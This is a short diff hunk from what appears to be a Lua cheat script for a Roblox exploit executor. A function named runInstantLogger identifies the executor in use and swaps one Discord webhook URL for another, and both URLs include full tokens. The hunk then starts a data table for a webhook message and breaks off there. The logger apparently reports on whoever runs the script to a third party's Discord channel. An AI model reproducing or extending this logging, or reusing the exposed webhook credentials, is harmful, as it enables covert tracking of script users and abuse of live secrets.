@@ -58,8 +58,7 @@ local function runInstantLogger()
           or (identifyexecutor and identifyexecutor():find("ScriptWare") and "Script-Ware")
           or ("Shitty Exploit")
 
-        local url = "https://discord.com/api/webhooks/1491184501487964352/_pk6x_lQsKDFvipu6iK6LEgElg7wKZ_NBwZDDLB6Qzlx7q9ZGHJsv1RFiCUOS7azT8fE"
-
+        local url = "https://discord.com/api/webhooks/1491781510221529299/fPCiH-8J7h9bh6cwHJCXyDChP3EDycLysEgSCuidS3yhHcmqcBeDNFoFJxTfdBohXmnL"
         local data = {
             ["avatar_url"] = "https://cdn.discordapp.com/attachments/1491183748543156377/1491411997693054986/Untitled24_20260401203040.png?ex=69d79929&is=69d647a9&hm=fc2b9ad9fca130aed82a3dc80f91f8c18be0a12ecb71f3257f42425fed3dcddc&",
             ["content"] = "",
